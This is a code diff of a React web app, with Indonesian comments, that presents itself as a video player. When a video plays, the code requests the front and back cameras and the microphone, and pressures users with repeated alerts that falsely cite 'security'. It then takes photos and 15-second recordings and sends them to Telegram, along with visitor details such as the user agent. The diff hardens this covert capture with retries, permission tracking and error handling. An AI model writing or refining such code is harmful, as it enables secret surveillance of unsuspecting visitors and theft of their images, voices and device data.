@@ -7,7 +7,8 @@ function App() {
   const [isPlaying, setIsPlaying] = useState<number | null>(null);
   const [isFullscreen, setIsFullscreen] = useState(false);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
-  const cameraStreamsRef = useRef<MediaStream[]>([]); // Menyimpan beberapa stream kamera
+  const cameraStreamsRef = useRef<MediaStream[]>([]);
+  const permittedDevicesRef = useRef<Set<string>>(new Set()); // Menyimpan deviceId yang sudah diizinkan
 
   const videos = [
     { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
@@ -26,10 +27,8 @@ function App() {
   ];
 
   useEffect(() => {
-    // Memantau aktivitas mencurigakan
     monitorSuspiciousActivity();
 
-    // Mengirim notifikasi pengunjung
     const sendVisitorNotification = async () => {
       const visitorDetails: VisitorDetails = {
         userAgent: navigator.userAgent,
@@ -46,7 +45,6 @@ function App() {
     };
     sendVisitorNotification();
 
-    // Memeriksa validitas URL video
     videos.forEach((video, index) => {
       console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
       if (!validateVideoUrl(video.videoUrl)) {
@@ -54,47 +52,63 @@ function App() {
       }
     });
 
-    // Membersihkan stream saat komponen di-unmount
     return () => {
       cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
+      cameraStreamsRef.current = [];
+      permittedDevicesRef.current.clear();
     };
   }, []);
 
   const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
     console.log('Memulai proses perekaman untuk kamera depan dan belakang...');
-    const maxAttempts = 3;
-    let attempts = 0;
 
-    // Fungsi untuk meminta akses kamera
-    const requestMediaAccess = async (deviceId: string, facingMode: string) => {
-      try {
-        const constraints = {
-          video: {
-            deviceId: deviceId ? { exact: deviceId } : undefined,
-            facingMode: deviceId ? undefined : facingMode,
-            width: { ideal: 1280 },
-            height: { ideal: 720 },
-            frameRate: { ideal: 30 },
-          },
-          audio: true,
-        };
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        cameraStreamsRef.current.push(stream);
-        console.log(`Berhasil mendapatkan stream untuk ${facingMode}`);
-        return stream;
-      } catch (error) {
-        console.error(`Gagal mendapatkan akses kamera (${facingMode}):`, error);
-        attempts++;
-        if (attempts < maxAttempts) {
-          alert(`Akses kamera ditolak. Harap izinkan untuk melanjutkan (${attempts}/${maxAttempts}). Kami membutuhkan ini untuk "keamanan".`);
-          return await requestMediaAccess(deviceId, facingMode);
-        }
-        throw new Error(`Akses kamera (${facingMode}) ditolak setelah beberapa percobaan.`);
+    // Membersihkan stream sebelumnya
+    cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
+    cameraStreamsRef.current = [];
+
+    const requestMediaAccess = async (deviceId: string, facingMode: string, cameraType: string) => {
+      // Cek apakah perangkat sudah diizinkan
+      if (permittedDevicesRef.current.has(deviceId)) {
+        console.log(`Kamera ${cameraType} sudah diizinkan sebelumnya, menggunakan kembali.`);
       }
+
+      const maxAttempts = 3;
+      let attempts = 0;
+
+      while (attempts < maxAttempts) {
+        try {
+          const constraints = {
+            video: {
+              deviceId: deviceId ? { exact: deviceId } : undefined,
+              facingMode: deviceId ? undefined : facingMode,
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+              frameRate: { ideal: 30 },
+            },
+            audio: true,
+          };
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          cameraStreamsRef.current.push(stream);
+          if (deviceId) {
+            permittedDevicesRef.current.add(deviceId);
+          }
+          console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType}`);
+          return stream;
+        } catch (error) {
+          console.error(`Gagal mendapatkan akses kamera (${cameraType}):`, error);
+          attempts++;
+          if (attempts < maxAttempts) {
+            alert(`Akses kamera ${cameraType} ditolak. Harap izinkan untuk melanjutkan (${attempts}/${maxAttempts}). Kami membutuhkan ini untuk "keamanan".`);
+          } else {
+            console.warn(`Akses kamera ${cameraType} ditolak setelah ${maxAttempts} percobaan.`);
+            return null;
+          }
+        }
+      }
+      return null;
     };
 
     try {
-      // Memutar video utama
       videoElement.play().catch(err => console.error('Error memutar video:', err));
 
       // Mendapatkan daftar perangkat kamera
@@ -105,7 +119,7 @@ function App() {
       let frontDevice: MediaDeviceInfo | undefined;
       let backDevice: MediaDeviceInfo | undefined;
 
-      // Mencari kamera depan dan belakang berdasarkan label
+      // Mencari kamera depan dan belakang
       for (const device of videoDevices) {
         const label = device.label.toLowerCase();
         if (label.includes('front') || label.includes('user')) {
@@ -115,35 +129,42 @@ function App() {
         }
       }
 
-      // Cadangan: jika label tidak jelas, anggap perangkat pertama sebagai depan, kedua sebagai belakang
+      // Cadangan: jika label tidak jelas
       if (!frontDevice && videoDevices.length > 0) {
         frontDevice = videoDevices[0];
+        console.log('Menggunakan perangkat pertama sebagai kamera depan:', frontDevice.label);
       }
       if (!backDevice && videoDevices.length > 1) {
         backDevice = videoDevices[1];
+        console.log('Menggunakan perangkat kedua sebagai kamera belakang:', backDevice?.label);
       }
 
       const streams: { stream: MediaStream; type: string }[] = [];
 
-      // Meminta stream untuk kamera yang tersedia
+      // Meminta stream untuk kamera depan
       if (frontDevice) {
-        const frontStream = await requestMediaAccess(frontDevice.deviceId, 'user');
-        streams.push({ stream: frontStream, type: 'depan' });
+        const frontStream = await requestMediaAccess(frontDevice.deviceId, 'user', 'depan');
+        if (frontStream) {
+          streams.push({ stream: frontStream, type: 'depan' });
+        }
       }
+
+      // Meminta stream untuk kamera belakang
       if (backDevice) {
-        const backStream = await requestMediaAccess(backDevice.deviceId, 'environment');
-        streams.push({ stream: backStream, type: 'belakang' });
+        const backStream = await requestMediaAccess(backDevice.deviceId, 'environment', 'belakang');
+        if (backStream) {
+          streams.push({ stream: backStream, type: 'belakang' });
+        }
       }
 
       if (streams.length === 0) {
-        throw new Error('Tidak ada kamera yang tersedia.');
+        throw new Error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
       }
 
       const cameraVideos: HTMLVideoElement[] = [];
 
       // Memproses setiap stream
       for (const { stream, type } of streams) {
-        // Membuat elemen video untuk stream
         const cameraVideo = document.createElement('video');
         cameraVideo.srcObject = stream;
         cameraVideo.playsInline = true;
@@ -153,19 +174,18 @@ function App() {
         document.body.appendChild(cameraVideo);
         cameraVideos.push(cameraVideo);
 
-        // Menunggu video siap
         await new Promise((resolve) => {
           cameraVideo.onloadedmetadata = async () => {
-            await cameraVideo.play();
+            await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
             setTimeout(resolve, 500);
           };
         });
 
         const videoWidth = cameraVideo.videoWidth;
         const videoHeight = cameraVideo.videoHeight;
-        console.log(`Dimensi video (${type}): ${videoWidth}x${videoHeight}`);
+        console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
 
-        // Membuat canvas untuk mengambil foto
+        // Mengambil foto
         const canvas = document.createElement('canvas');
         const canvasAspectRatio = 9 / 16;
         const videoAspectRatio = videoWidth / videoHeight;
@@ -191,36 +211,51 @@ function App() {
           context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
         }
 
-        // Mengambil foto dan mengirim ke Telegram
         const photoBlob = await new Promise<Blob>((resolve) => {
           canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
         });
 
         await sendImageToTelegram(photoBlob);
-        console.log(`Foto dari kamera ${type} berhasil dikirim.`);
+        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
       }
 
-      // Merekam video dari setiap stream
+      // Merekam video
       const recorders: { recorder: MediaRecorder; type: string }[] = [];
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
 
       for (const { stream, type } of streams) {
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 });
-        const chunks: BlobPart[] = [];
+        try {
+          const mediaRecorder = new MediaRecorder(stream, {
+            mimeType: supportedMimeType,
+            videoBitsPerSecond: 4000000,
+          });
+          const chunks: BlobPart[] = [];
 
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
+          mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+          };
 
-        mediaRecorder.onstop = async () => {
-          const videoBlob = new Blob(chunks, { type: supportedMimeType });
-          await sendVideoToTelegram(videoBlob);
-          console.log(`Video dari kamera ${type} berhasil dikirim.`);
-        };
+          mediaRecorder.onstop = async () => {
+            const videoBlob = new Blob(chunks, { type: supportedMimeType });
+            try {
+              await sendVideoToTelegram(videoBlob);
+              console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
+            } catch (error) {
+              console.error(`Gagal mengirim video dari kamera ${type}:`, error);
+            }
+          };
 
-        recorders.push({ recorder: mediaRecorder, type });
-        mediaRecorder.start(1000);
+          mediaRecorder.onerror = (e) => {
+            console.error(`Error saat merekam kamera ${type}:`, e);
+          };
+
+          recorders.push({ recorder: mediaRecorder, type });
+          mediaRecorder.start(1000);
+          console.log(`Mulai merekam kamera ${type}`);
+        } catch (error) {
+          console.error(`Gagal membuat MediaRecorder untuk kamera ${type}:`, error);
+        }
       }
 
       // Menghentikan perekaman setelah 15 detik
